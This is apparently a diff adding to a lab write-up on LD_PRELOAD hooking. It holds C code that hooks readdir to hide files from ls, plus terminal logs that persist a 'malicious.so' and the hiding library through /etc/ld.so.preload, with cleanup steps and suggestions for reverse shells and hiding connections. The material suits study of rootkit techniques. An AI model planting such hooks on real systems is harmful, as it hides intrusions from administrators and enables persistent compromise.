@@ -478,3 +478,244 @@ With the map all set, let's get to coding!
 
 #define FILENAME "ld.so.preload"
 
+struct dirent *readdir(DIR *dirp)
+{
+     struct dirent *(*old_readdir)(DIR *dir);     
+     old_readdir = dlsym(RTLD_NEXT, "readdir");
+     struct dirent *dir;
+     while (dir = old_readdir(dirp))
+     {
+           if(strstr(dir->d_name,FILENAME) == 0) break;     
+     }
+     return dir;
+}
+
+struct dirent64 *readdir64(DIR *dirp)
+{
+     struct dirent64 *(*old_readdir64)(DIR *dir);     
+     old_readdir64 = dlsym(RTLD_NEXT, "readdir64");
+     struct dirent64 *dir;
+     while (dir = old_readdir64(dirp))
+     {
+           if(strstr(dir->d_name,FILENAME) == 0) break;
+     }
+     return dir;
+}
+
+[Note : The readdir64 is just the 64-bit version of the same and follows the same concepts so don't worry about it !]
+
+Breaking down our hook, we have:
+
+    First we declare our usual headers with the extra #include <dirent.h> header which contains the definition of the dirent structure
+    Then, we do our usual hooking stuff: creating a function with the same definition and return type, create a function pointer and use dlsym to store the value of the original function in it.
+    Finally coming to the most crucial part, we create a while loop and fetch the pointer to the next dirent structure in the directory stream pointed to by dirp and check if the d_name parameter contains our string. If it doesn't (which is denoted by an output 0 as a result of the strstr function), we simply break from the loop and return the value as obtained from the original function. However, if we have a match, we iterate one more time, thereby effectively skipping over our file a return pointer to the dirent structure pertaining to the next file in the directory.
+
+It is to be noted that you can still modify the file or cat out its contents. However, it will not show in the output of the ls command! This can be very useful if you want to hide malicious files, alter filenames, etc. One very popular use is to hide the /etc/ld.so.preload file or the shared object itself!
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/C_hooking]
+└─$ cat /etc/ld.so.preload
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/C_hooking]
+└─$ ls /etc/ | grep ld.so.preload
+ld.so.preload
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/C_hooking]
+└─$ export LD_PRELOAD=$(pwd)/hidefile.so
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/C_hooking]
+└─$ ls                           
+hello         hidefile.so  malicious.so  test
+helloworld.c  malicious.c  Task6.c
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/C_hooking]
+└─$ cat test              
+Hello World
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/C_hooking]
+└─$ ldd /bin/ls                         
+        linux-vdso.so.1 (0x00007ffec1f56000)
+        /home/kali/Downloads/C_hooking/hidefile.so (0x00007f5bb8628000)
+        libselinux.so.1 => /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007f5bb85e8000)
+        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f5bb840f000)
+        libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f5bb8409000)
+        libpcre2-8.so.0 => /lib/x86_64-linux-gnu/libpcre2-8.so.0 (0x00007f5bb836d000)
+        /lib64/ld-linux-x86-64.so.2 (0x00007f5bb8655000)
+        libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f5bb834c000)
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/C_hooking]
+└─$ export LD_PRELOAD=$(pwd)/malicious.so
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/C_hooking]
+└─$ cat test
+Hacked 1337
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/C_hooking]
+└─$ sudo sh -c "echo $(pwd)/hidefile.so > /etc/ld.so.preload"
+[sudo] password for kali:
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/C_hooking]
+└─$ ls                                   
+hello         hidefile.so  malicious.so  test
+helloworld.c  malicious.c  Task6.c
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/C_hooking]
+└─$ cat test
+Hacked 1337
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/C_hooking]
+└─$ ls /etc/ | grep ld.so.preload
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/C_hooking]
+└─$ cat /etc/ld.so.preload
+/home/kali/Downloads/C_hooking/hidefile.so
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/C_hooking]
+└─$ ldd /bin/ls                  
+        linux-vdso.so.1 (0x00007ffc2cede000)
+        /home/kali/Downloads/C_hooking/malicious.so (0x00007fda841e4000)
+        /home/kali/Downloads/C_hooking/hidefile.so (0x00007fda841de000)
+        libselinux.so.1 => /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007fda8419e000)
+        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fda83fc5000)
+        libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fda83fbf000)
+        libpcre2-8.so.0 => /lib/x86_64-linux-gnu/libpcre2-8.so.0 (0x00007fda83f23000)
+        /lib64/ld-linux-x86-64.so.2 (0x00007fda84211000)
+        libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007fda83f00000)
+            
+To go back to the usual just remove the shared library from LD_PRELOAD with :
+export LD_PRELOAD=
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/C_hooking]
+└─$ cat /etc/ld.so.preload
+/home/kali/Downloads/C_hooking/hidefile.so
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/C_hooking]
+└─$ ldd /bin/ls                  
+        linux-vdso.so.1 (0x00007ffc2cede000)
+        /home/kali/Downloads/C_hooking/malicious.so (0x00007fda841e4000)
+        /home/kali/Downloads/C_hooking/hidefile.so (0x00007fda841de000)
+        libselinux.so.1 => /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007fda8419e000)
+        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fda83fc5000)
+        libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fda83fbf000)
+        libpcre2-8.so.0 => /lib/x86_64-linux-gnu/libpcre2-8.so.0 (0x00007fda83f23000)
+        /lib64/ld-linux-x86-64.so.2 (0x00007fda84211000)
+        libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007fda83f00000)
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/C_hooking]
+└─$ export LD_PRELOAD=
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/C_hooking]
+└─$ ldd /bin/ls                                              
+        linux-vdso.so.1 (0x00007fffef883000)
+        /home/kali/Downloads/C_hooking/hidefile.so (0x00007fb6bd36f000)
+        libselinux.so.1 => /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007fb6bd32f000)
+        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb6bd156000)
+        libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fb6bd150000)
+        libpcre2-8.so.0 => /lib/x86_64-linux-gnu/libpcre2-8.so.0 (0x00007fb6bd0b4000)
+        /lib64/ld-linux-x86-64.so.2 (0x00007fb6bd39d000)
+        libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007fb6bd093000)
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/C_hooking]
+└─$ sudo sh -c "echo '' > /etc/ld.so.preload"
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/C_hooking]
+└─$ ls                           
+hello         hidefile.so  malicious.so  test
+helloworld.c  malicious.c  Task6.c
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/C_hooking]
+└─$ ldd /bin/ls
+        linux-vdso.so.1 (0x00007ffe290b7000)
+        libselinux.so.1 => /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007f0d96ee2000)
+        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f0d96d09000)
+        libpcre2-8.so.0 => /lib/x86_64-linux-gnu/libpcre2-8.so.0 (0x00007f0d96c6d000)
+        libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f0d96c67000)
+        /lib64/ld-linux-x86-64.so.2 (0x00007f0d96f4a000)
+        libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f0d96c46000)
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/C_hooking]
+└─$ cat /etc/ld.so.preload
+
+*** (enabled)
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/C_hooking]
+└─$ export LD_PRELOAD=$(pwd)/malicious.so
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/C_hooking]
+└─$ sudo sh -c "echo $(pwd)/hidefile.so > /etc/ld.so.preload"
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/C_hooking]
+└─$ ldd /bin/ls
+        linux-vdso.so.1 (0x00007ffd4d3cb000)
+        /home/kali/Downloads/C_hooking/malicious.so (0x00007fd22c487000)
+        /home/kali/Downloads/C_hooking/hidefile.so (0x00007fd22c481000)
+        libselinux.so.1 => /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007fd22c441000)
+        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fd22c268000)
+        libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fd22c262000)
+        libpcre2-8.so.0 => /lib/x86_64-linux-gnu/libpcre2-8.so.0 (0x00007fd22c1c6000)
+        /lib64/ld-linux-x86-64.so.2 (0x00007fd22c4b4000)
+        libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007fd22c1a3000)
+***
+
+***(disabled)
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/C_hooking]
+└─$ export LD_PRELOAD=
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/C_hooking]
+└─$ sudo sh -c "echo ''  > /etc/ld.so.preload"
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/C_hooking]
+└─$ ldd /bin/ls
+        linux-vdso.so.1 (0x00007ffe49b7b000)
+        libselinux.so.1 => /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007fb2f5eed000)
+        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb2f5d14000)
+        libpcre2-8.so.0 => /lib/x86_64-linux-gnu/libpcre2-8.so.0 (0x00007fb2f5c78000)
+        libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fb2f5c72000)
+        /lib64/ld-linux-x86-64.so.2 (0x00007fb2f5f55000)
+        libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007fb2f5c51000)
+
+***
+
+There are two mandatory fields of a dirent structure. One is d_name, and the other one is? d_ino
+
+Conclusion
+
+So we saw what are shared libraries, wrote some code, pre-loaded our malicious object files, had some fun playing around. But we have barely touched the tip of the iceberg here. Here are some ideas you can try on your own:
+
+    Popping up bind and reverse shells by hooking write() based on certain triggers
+    Hiding connections from netsat and lsof by hooking the function fopen()
+    Logging requests by hooking SSL_write()
+    And a lot more!
+```
+
+## Notes / Lessons Learned
+[[JPGChat]]
+
